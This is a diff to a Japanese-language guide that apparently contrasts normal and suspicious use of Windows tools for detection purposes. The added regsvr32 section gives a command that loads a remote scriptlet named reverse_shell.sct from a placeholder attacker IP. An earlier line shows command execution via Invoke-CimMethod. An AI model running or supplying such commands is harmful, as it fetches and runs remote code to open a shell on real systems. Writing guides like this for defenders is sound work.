@@ -45,3 +45,15 @@ Get-CimInstance Win32_Process -Filter "name = 'test_tool.exe' AND ExecutionState
 ### 不審な挙動
 他のプロセスを経由してコマンドを実行させる。  
 `Get-CimInstance Win32_Process -Filter "name = 'MsMpEng.exe'" | Invoke-CimMethod -MethodName`
+
+## Step4 regsvr32
+### 正規の挙動
+WindowsのシステムにDLLを登録するために使う。外部通信は発生しないことが多い。
+```powershell
+regsvr32.exe C:\Windows\System32\sample.dll
+regsvr32.exe /s "C:\Program Files\App\extension.dll"
+```
+### 不審な挙動
+外部からスクリプトレットを読み込み、メモリ上で悪意のある動作をさせる。  
+通常他プロセスが起動することはないため、スクリプトレットを悪用してPowershellなどを起動すると子プロセスができる。  
+`regsvr32.exe /s /u /i:http://<攻撃者IP>:8000/reverse_shell.sct scrobj.dll`
